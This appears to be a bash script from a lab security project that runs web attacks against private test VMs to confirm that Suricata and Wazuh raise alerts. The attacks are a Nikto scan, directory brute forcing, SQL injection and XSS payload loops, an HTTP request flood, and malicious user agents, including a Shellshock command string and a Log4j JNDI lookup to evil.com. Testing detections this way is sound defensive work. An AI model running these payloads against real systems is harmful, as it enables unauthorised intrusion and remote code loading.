#!/bin/bash
###############################################################################
# PHASE 1: SIEM VALIDATION - WEB APPLICATION ATTACKS
# Cloud Security Project - Kali Linux Attack Scripts
#
# These attacks target the OCP PHP web application once deployed
# Can also test against any web service on the target VMs
#
# Expected Detections:
#   - Suricata: ET WEB_SERVER/Web Application Attack alerts
#   - Wazuh: Apache/Nginx error logs, Suricata IDS alerts
#   - Custom Wazuh rules for web attacks
###############################################################################

set -e

# =============================================================================
# CONFIGURATION
# =============================================================================
# Before OCP deployment, test against VM web services
UBUNTU_IP="192.168.1.102"
DEBIAN_IP="192.168.1.101"

# After OCP deployment, use these:
# OCP_APP_URL="https://app.yourdomain.com"
OCP_APP_URL="http://$UBUNTU_IP:80"  # Update after Phase 2

RESULTS_DIR="/root/attack-results/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$RESULTS_DIR"

echo "========================================================================"
echo "  CLOUD SECURITY PROJECT - PHASE 1: SIEM VALIDATION"
echo "  Attack Category: Web Application Attacks"
echo "  Target: $OCP_APP_URL"
echo "  Start Time: $(date)"
echo "========================================================================"

# =============================================================================
# ATTACK 3.1: Web Vulnerability Scan (Nikto)
# =============================================================================
echo ""
echo "[3.1] Web Vulnerability Scan..."
echo "      Tool: nikto -h <target>"
echo "      Expected: Suricata 'ET WEB_SERVER/Web Application Scan' alerts"

nikto -h "$OCP_APP_URL" \
      -output "$RESULTS_DIR/01_nikto_scan.txt" \
      2>&1 | tee "$RESULTS_DIR/01_nikto_scan_live.log" || true

echo "[3.1] Complete. Waiting 30 seconds..."
sleep 30

# =============================================================================
# ATTACK 3.2: Directory Brute Force (Gobuster)
# =============================================================================
echo ""
echo "[3.2] Directory and File Brute Force..."
echo "      Tool: gobuster dir"
echo "      Expected: Suricata HTTP anomaly detection"

if command -v gobuster &> /dev/null; then
    gobuster dir -u "$OCP_APP_URL" \
        -w /usr/share/wordlists/dirb/common.txt \
        -o "$RESULTS_DIR/02_gobuster_dirs.txt" \
        2>&1 | tee "$RESULTS_DIR/02_gobuster_dirs_live.log" || true
else
    echo "      [!] Gobuster not found, using dirb instead..."
    dirb "$OCP_APP_URL" /usr/share/wordlists/dirb/common.txt \
         -o "$RESULTS_DIR/02_dirb_results.txt" \
         2>&1 | tee "$RESULTS_DIR/02_dirb_results_live.log" || true
fi

echo "[3.2] Complete. Waiting 30 seconds..."
sleep 30

# =============================================================================
# ATTACK 3.3: SQL Injection Testing
# =============================================================================
echo ""
echo "[3.3] Basic SQL Injection Payloads..."
echo "      Method: curl with SQLi payloads"
echo "      Expected: Wazuh Apache error logs, Suricata web attack alerts"

SQLI_PAYLOADS=(
    "' OR '1'='1"
    "' OR '1'='1' --"
    "1' UNION SELECT NULL--"
    "1 AND 1=1"
    "1 AND 1=2"
    "admin'--"
    "1' WAITFOR DELAY '0:0:5'--"
)

# Common injection points
ENDPOINTS=(
    "/"
    "/login.php"
    "/search.php"
    "/index.php?id=1"
    "/api/users"
)

for endpoint in "${ENDPOINTS[@]}"; do
    for payload in "${SQLI_PAYLOADS[@]}"; do
        url="${OCP_APP_URL}${endpoint}"
        echo "    Testing: $url with payload: $payload"
        
        # Test GET parameter
        curl -s -o /dev/null -w "%{http_code}" \
             -A "Mozilla/5.0 (Security-Test)" \
             "${url}?q=${payload}&username=${payload}" \
             2>&1 | tee -a "$RESULTS_DIR/03_sqli_test.log" || true
        
        # Test POST data
        curl -s -o /dev/null -w "%{http_code}" -X POST \
             -A "Mozilla/5.0 (Security-Test)" \
             -d "username=${payload}&password=test" \
             "$url" 2>&1 | tee -a "$RESULTS_DIR/03_sqli_test.log" || true
        
        sleep 1
    done
done

echo "[3.3] Complete. Waiting 30 seconds..."
sleep 30

# =============================================================================
# ATTACK 3.4: Cross-Site Scripting (XSS) Payloads
# =============================================================================
echo ""
echo "[3.4] XSS Payload Testing..."
echo "      Method: curl with XSS payloads"
echo "      Expected: Wazuh web application alerts"

XSS_PAYLOADS=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "<body onload=alert(1)>"
    "javascript:alert(1)"
)

for payload in "${XSS_PAYLOADS[@]}"; do
    echo "    Testing XSS payload: ${payload:0:50}..."
    
    curl -s -o /dev/null -w "%{http_code}" \
         -A "Mozilla/5.0 (Security-Test)" \
         "${OCP_APP_URL}/search.php?q=${payload}" \
         2>&1 | tee -a "$RESULTS_DIR/04_xss_test.log" || true
    
    sleep 1
done

echo "[3.4] Complete. Waiting 30 seconds..."
sleep 30

# =============================================================================
# ATTACK 3.5: HTTP Flood / DoS Simulation
# =============================================================================
echo ""
echo "[3.5] HTTP Request Flood..."
echo "      Tool: ab (Apache Bench) or custom curl loop"
echo "      Expected: Suricata 'ET SCAN HTTP Traffic Loop' or similar"

# Use curl loop for flooding
for i in {1..100}; do
    curl -s -o /dev/null -w "." \
         -A "Mozilla/5.0 (LoadTest)" \
         "$OCP_APP_URL" &
    
    # Run 10 concurrent every batch
    if (( i % 10 == 0 )); then
        wait
        sleep 0.5
    fi
done
wait

echo ""
echo "[3.5] Complete. Waiting 30 seconds..."
sleep 30

# =============================================================================
# ATTACK 3.6: User-Agent Fuzzing (Suspicious UAs)
# =============================================================================
echo ""
echo "[3.6] Suspicious User-Agent Requests..."
echo "      Method: curl with known malicious user agents"
echo "      Expected: Suricata ET WEB_Malicious User-Agent"

SUSPICIOUS_UAS=(
    "sqlmap/1.0"
    "Nikto/2.1.6"
    "Nmap Scripting Engine"
    "Masscan/1.0"
    "Mozilla/5.0 () { :; }; /bin/bash -c 'whoami'"  # Shellshock attempt
    "\${jndi:ldap://evil.com/a}"  # Log4j attempt
)

for ua in "${SUSPICIOUS_UAS[@]}"; do
    echo "    Testing UA: ${ua:0:50}"
    
    curl -s -o /dev/null -w "%{http_code}" \
         -A "$ua" \
         "$OCP_APP_URL" \
         2>&1 | tee -a "$RESULTS_DIR/05_suspicious_ua.log" || true
    
    sleep 1
done

echo "[3.6] Complete."

# =============================================================================
# SUMMARY
# =============================================================================
echo ""
echo "========================================================================"
echo "  WEB APPLICATION ATTACKS COMPLETE"
echo "  Results saved to: $RESULTS_DIR"
echo "  End Time: $(date)"
echo ""
echo "  VERIFICATION CHECKLIST:"
echo "  [ ] Wazuh Dashboard: Web-related alerts"
echo "  [ ] Filter: rule.groups:web OR rule.groups:suricata"
echo "  [ ] Check Apache/Nginx error logs on target"
echo "  [ ] Review Suricata alerts: grep 'WEB' /var/log/suricata/fast.log"
echo "========================================================================"
